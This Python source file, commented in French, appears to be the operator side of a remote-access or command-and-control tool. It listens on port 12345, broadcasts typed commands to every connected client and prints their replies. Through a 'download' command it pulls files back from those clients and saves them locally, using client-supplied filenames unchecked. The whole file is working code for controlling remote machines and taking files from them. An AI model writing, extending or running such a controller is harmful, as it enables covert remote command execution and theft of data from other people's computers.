import socket
import struct

HOST = '0.0.0.0'  
PORT = 12345

# Création du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #liberer le port après une interruption
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"Serveur en attente de connexion sur {HOST}:{PORT}")

clients = []

# COMMANDE : download 
def recv_all(sock, length):
    data = b''
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Connexion interrompue")
        data += more
    return data

def receive_files(sock):
    try:
        while True:
            # Lire la longueur du nom de fichier (4 octets)
            raw = sock.recv(4)
            if not raw:
                break  # fin de transmission
            name_len = struct.unpack("!I", raw)[0]

            filename = recv_all(sock, name_len).decode()

            if filename.startswith("__ERROR__"):
                print(f"Erreur côté client : {filename}")
                continue

            # Lire la taille du fichier (8 octets)
            filesize = struct.unpack("!Q", recv_all(sock, 8))[0]

            print(f"⬇Réception de {filename} ({filesize} octets)...")

            with open(f"downloaded_{filename}", "wb") as f:
                remaining = filesize
                while remaining > 0:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        raise EOFError("Interruption lors du transfert")
                    f.write(chunk)
                    remaining -= len(chunk)

            print(f"Fichier reçu : downloaded_{filename}")

    except Exception as e:
        print(f"Erreur lors de la réception : {e}")


while True:
    client_socket, addr = server_socket.accept()
    print(f"New connection from {addr}")
    clients.append(client_socket)

    while True:
        command = input("Enter command to send: ")
        if command == "exit":
            break

        for c in clients:
            try:
                c.send(command.encode())

                if command.startswith("download "):
                    receive_files(c)
                else:
                    response = c.recv(4096).decode()
                    print(f"[{addr}] Response : \n{response}")                   
            except:
                print(f"Failed to send to {addr}")


